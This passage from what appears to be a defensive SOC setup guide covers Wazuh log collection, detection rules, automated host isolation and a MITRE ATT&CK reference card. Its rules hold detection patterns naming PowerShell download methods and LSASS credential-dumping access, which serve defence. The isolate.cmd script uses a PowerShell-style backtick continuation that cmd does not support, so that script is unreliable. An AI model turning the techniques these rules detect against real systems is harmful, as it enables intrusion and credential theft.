  <!-- Log collection -->
  <localfile>
    <location>Microsoft-Windows-Sysmon/Operational</location>
    <log_format>eventchannel</log_format>
  </localfile>
  
  <localfile>
    <location>Microsoft-Windows-PowerShell/Operational</location>
    <log_format>eventchannel</log_format>
  </localfile>
  
  <localfile>
    <location>Security</location>
    <log_format>eventchannel</log_format>
    <query>Event/System[EventID=4624 or EventID=4625 or EventID=4648 or EventID=4698]</query>
  </localfile>
  
  <!-- File integrity monitoring -->
  <syscheck>
    <directories check_all="yes">C:\Windows\System32\drivers</directories>
    <directories check_all="yes">C:\Windows\System32\config</directories>
    <directories check_all="yes">HKEY_LOCAL_MACHINE\SOFTWARE</directories>
  </syscheck>
  
  <!-- Active response -->
  <active-response>
    <disabled>no</disabled>
  </active-response>
</ossec_config>
```

#### Step 5: Create Detection Rules (Week 4-6)

**5.1 Sysmon Detection Rules:**

**Rule: Detect PowerShell Download Activity**
```xml
<!-- local_rules.xml -->
<group name="sysmon,">
  <rule id="100001" level="12">
    <if_sid>61603</if_sid>
    <field name="win.eventdata.image" type="pcre2">(?i)powershell\.exe</field>
    <field name="win.eventdata.commandLine" type="pcre2">(?i)(Net\.WebClient|DownloadString|DownloadFile|Invoke-WebRequest)</field>
    <description>Suspicious PowerShell download activity detected (MITRE T1059.001)</description>
    <mitre>
      <id>T1059.001</id>
    </mitre>
  </rule>
</group>
```

**Rule: Detect LSASS Memory Access**
```xml
<group name="sysmon,">
  <rule id="100002" level="15">
    <if_sid>61610</if_sid>
    <field name="win.eventdata.targetImage" type="pcre2">(?i)\\lsass\.exe</field>
    <field name="win.eventdata.grantedAccess">0x1010|0x1410|0x147a|0x143a</field>
    <description>Potential credential dumping - LSASS access detected (MITRE T1003.001)</description>
    <mitre>
      <id>T1003.001</id>
    </mitre>
  </rule>
</group>
```

**Rule: Detect Scheduled Task Creation**
```xml
<group name="windows,">
  <rule id="100003" level="10">
    <if_sid>60106</if_sid>
    <field name="win.system.eventID">^4698$</field>
    <description>Scheduled task created (MITRE T1053.005)</description>
    <mitre>
      <id>T1053.005</id>
    </mitre>
  </rule>
  
  <rule id="100004" level="14">
    <if_sid>100003</if_sid>
    <field name="win.eventdata.taskName" type="pcre2">(?i)(Windows|Microsoft)</field>
    <description>Suspicious scheduled task with misleading name (MITRE T1053.005)</description>
    <mitre>
      <id>T1053.005</id>
    </mitre>
  </rule>
</group>
```

**5.2 Sigma Rules (Convert to SIEM syntax):**

Use Sigma to SIEM converter: https://github.com/SigmaHQ/sigma

```bash
# Convert Sigma rule to Splunk
sigma convert -t splunk -p windows rule.yml

# Convert Sigma rule to Elastic
sigma convert -t elasticsearch rule.yml

# Convert Sigma rule to QRadar
sigma convert -t qradar rule.yml
```

#### Step 6: Configure Automated Response (Week 6-7)

**6.1 Active Response Configuration:**
```xml
<ossec_config>
  <command>
    <name>isolate-host</name>
    <executable>isolate.cmd</executable>
    <timeout_allowed>no</timeout_allowed>
  </command>
  
  <active-response>
    <command>isolate-host</command>
    <location>local</location>
    <rules_id>100002</rules_id>  <!-- LSASS access -->
    <timeout>3600</timeout>
  </active-response>
</ossec_config>
```

**6.2 Isolation Script (isolate.cmd):**
```batch
@echo off
REM Isolate host by blocking all network traffic except to SIEM

REM Block all inbound traffic
netsh advfirewall set allprofiles firewallpolicy blockinbound,blockoutbound

REM Allow outbound to SIEM only
netsh advfirewall firewall add rule name="Allow SIEM" dir=out action=allow `
  remoteip=192.168.1.10 protocol=TCP remoteport=1514

REM Log action
echo %DATE% %TIME% - Host isolated due to security alert >> C:\Security\isolation.log
```

### Quick Reference Card: MITRE ATT&CK for Incident Responders

```
╔══════════════════════════════════════════════════════════════════════╗
║         MITRE ATT&CK QUICK REFERENCE - RANSOMWARE RESPONSE          ║
╠══════════════════════════════════════════════════════════════════════╣
║                                                                      ║
║  RECONNAISSANCE (TA0043)                                            ║
║  └─ Look for: External scanning, OSINT collection                  ║
║     Tools: Network IDS, web server logs                            ║
║     Log: Firewall logs, DNS logs                                   ║
║                                                                      ║
║  INITIAL ACCESS (TA0001)                                            ║
║  └─ Look for: Phishing emails, exploit attempts                    ║
║     Tools: Email gateway, endpoint AV                              ║
║     Log: Email logs, web proxy logs                                ║
║                                                                      ║
║  EXECUTION (TA0002)                                                 ║
║  └─ Look for: PowerShell, macros, scripts                         ║
║     Tools: Sysmon (Event ID 1), PowerShell logs                   ║
║     Log: Event ID 4104, 4103, Sysmon operational                  ║
║                                                                      ║
║  PERSISTENCE (TA0003)                                               ║
║  └─ Look for: Scheduled tasks, registry run keys                  ║
║     Tools: Autoruns, Process Monitor                               ║
║     Log: Event ID 4698, Registry auditing                         ║
║                                                                      ║
║  PRIVILEGE ESCALATION (TA0004)                                      ║
║  └─ Look for: LSASS access, token manipulation                    ║
║     Tools: Sysmon (Event ID 10), Process Explorer                 ║
║     Log: Event ID 4672, 4673, Sysmon Event 10                     ║
║                                                                      ║
║  DEFENSE EVASION (TA0005)                                           ║
║  └─ Look for: AV disablement, log clearing                        ║
║     Tools: Registry monitoring, service monitoring                 ║
║     Log: Event ID 1102, Service Control Manager logs              ║
║                                                                      ║
║  CREDENTIAL ACCESS (TA0006)                                         ║
║  └─ Look for: Credential dumping, keylogging                      ║
║     Tools: Sysmon (Event 10), authentication logs                 ║
║     Log: Event ID 4625, 4648, 4771                               ║
║                                                                      ║
║  DISCOVERY (TA0007)                                                 ║
║  └─ Look for: Network scanning, AD enumeration                    ║
║     Tools: Network monitoring, AD auditing                         ║
║     Log: Event ID 4662, network flow logs                         ║
║                                                                      ║
║  LATERAL MOVEMENT (TA0008)                                          ║
║  └─ Look for: PsExec, RDP, WMI usage                             ║
║     Tools: Sysmon (Event 3, 17, 18), network monitoring          ║
║     Log: Event ID 4624 (Type 3, 10), Sysmon Event 3              ║
║                                                                      ║
║  COLLECTION (TA0009)                                                ║
║  └─ Look for: Archive tools, screenshot capture                   ║
║     Tools: File monitoring, process monitoring                     ║
║     Log: Sysmon Event 1, 11, file access logs                     ║
║                                                                      ║
║  COMMAND & CONTROL (TA0011)                                         ║
║  └─ Look for: Beaconing, unusual network connections              ║
║     Tools: Network IDS, DNS monitoring                            ║
║     Log: Sysmon Event 3, DNS logs, proxy logs                     ║
║                                                                      ║
║  EXFILTRATION (TA0010)                                              ║
║  └─ Look for: Large data uploads, cloud storage                   ║
║     Tools: DLP, network monitoring                                 ║
║     Log: Firewall logs, proxy logs, Sysmon Event 3               ║
║                                                                      ║
║  IMPACT (TA0040)                                                    ║
║  └─ Look for: File encryption, shadow copy deletion              ║
║     Tools: File integrity monitoring, backup monitoring           ║
║     Log: Sysmon Event 11, 23, Event ID 524, 525                   ║
║                                                                      ║
╠══════════════════════════════════════════════════════════════════════╣
║                      CRITICAL WINDOWS EVENTS                         ║
╠══════════════════════════════════════════════════════════════════════╣
║  4624 - Successful logon (Type 3=Network, 10=RemoteInteractive)    ║
║  4625 - Failed logon attempt                                        ║
║  4648 - Logon using explicit credentials                            ║
║  4672 - Special privileges assigned to new logon                    ║
║  4698 - Scheduled task created                                      ║
║  4720 - User account created                                        ║
║  4771 - Kerberos pre-authentication failed                          ║
║  1102 - Audit log cleared                                          ║
║  4104 - PowerShell script block logging                             ║
║  7045 - Service installed                                           ║
╚══════════════════════════════════════════════════════════════════════╝
```

### Next Steps

### Additional Resources

**NIST Publications:**
- NIST CSF 2.0 (CSWP 29)
- SP 800-30: Guide for Conducting Risk Assessments
- SP 800-37: Risk Management Framework
- SP 800-53: Security and Privacy Controls
- SP 800-61: Computer Security Incident Handling Guide
- IR 8286: Integrating Cybersecurity and ERM

**Online Resources:**
- NIST CSF Website: https://www.nist.gov/cyberframework
- CSF Reference Tool: https://csf.tools
- MISP Project: https://www.misp-project.org
- Wazuh Documentation: https://documentation.wazuh.com
- Security Onion: https://securityonion.net

**Training:**
- NIST CSF Training Courses
- Wazuh Fundamentals
- MISP Training Materials
- Open Source Security Tools
- Risk Assessment Certification Programs

---

*Document Version: 1.0*  
*Last Updated: November 2025*  
*Framework Version: NIST CSF 2.0*
